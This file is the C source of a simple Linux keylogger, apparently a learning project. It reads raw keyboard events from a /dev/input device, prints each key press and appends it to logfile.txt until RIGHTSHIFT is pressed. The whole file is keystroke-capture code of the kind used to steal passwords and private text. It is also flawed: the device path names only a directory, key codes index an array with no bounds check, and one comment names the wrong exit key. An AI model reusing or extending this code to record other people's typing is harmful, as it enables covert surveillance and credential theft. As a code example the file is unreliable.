#include <stdio.h>
#include <stdlib.h>
#include <sys/time.h>
#include <string.h>
#include "input-event-codes.h"

struct input_event {
	struct timeval time;
	unsigned short type;
	unsigned short code;
	unsigned int value;
};

char exitKey[] = "RIGHTSHIFT";

char device[] ="/dev/input/"; //Input device

char logFile[] = "logfile.txt";


//translated keys from linux input event codes
const char *keycodes[] = {
    "RESERVED",
    "ESC",
    "1",
    "2",
    "3",
    "4",
    "5",
    "6",
    "7",
    "8",
    "9",
    "0",
    "MINUS",
    "EQUAL",
    "BACKSPACE",
    "TAB",
    "Q",
    "W",
    "E",
    "R",
    "T",
    "Y",
    "U",
    "I",
    "O",
    "P",
    "LEFTBRACE",
    "RIGHTBRACE",
    "ENTER",
    "LEFTCTRL",
    "A",
    "S",
    "D",
    "F",
    "G",
    "H",
    "J",
    "K",
    "L",
    "SEMICOLON",
    "APOSTROPHE",
    "GRAVE",
    "LEFTSHIFT",
    "BACKSLASH",
    "Z",
    "X",
    "C",
    "V",
    "B",
    "N",
    "M",
    "COMMA",
    "DOT",
    "SLASH",
    "RIGHTSHIFT",
    "KPASTERISK",
    "LEFTALT",
    "SPACE",
    "CAPSLOCK",
    "F1",
    "F2",
    "F3",
    "F4",
    "F5",
    "F6",
    "F7",
    "F8",
    "F9",
    "F10",
    "NUMLOCK",
    "SCROLLLOCK"
};



int main(void) {

	struct input_event keyboard;
	
	//Keyboard steam input
	FILE *fptr;
	fptr = fopen(device,"rb");
	if (fptr == NULL) {
		printf("Error! Could not open file\n");
		exit(-1);
	}
	
	
	//File for logging
	FILE *log = fopen(logFile, "a+");

   	 
   	 //Switch for when exit_key is pressed
	int loop = 1;

	//Kepp logging until capslocks
	while (loop) {
		fread(&keyboard, sizeof(struct input_event), 1, fptr);
	
		unsigned short type = keyboard.type;
		const char *keycode = keycodes[keyboard.code];
		unsigned int value =  keyboard.value;

		//Conditional to only get key presses and when they key is held down
		if ((keyboard.type == (unsigned short)1) && keyboard.value == (unsigned int) 1  || (  (keyboard.type == (unsigned short)1) && keyboard.value == (unsigned int) 2)) {
		
			
			printf("type: %u   key: %s    value: %u \n",type,keycode,value); //print key to terminal
			fprintf(log,"%s\n",keycode);  //print key to file
			
			//If exitKey, exit
			if (strcmp(keycode,exitKey) == 0) {
				loop = 0;
			}
		}
		
	}	
	fclose(log);
	fclose(fptr);
}























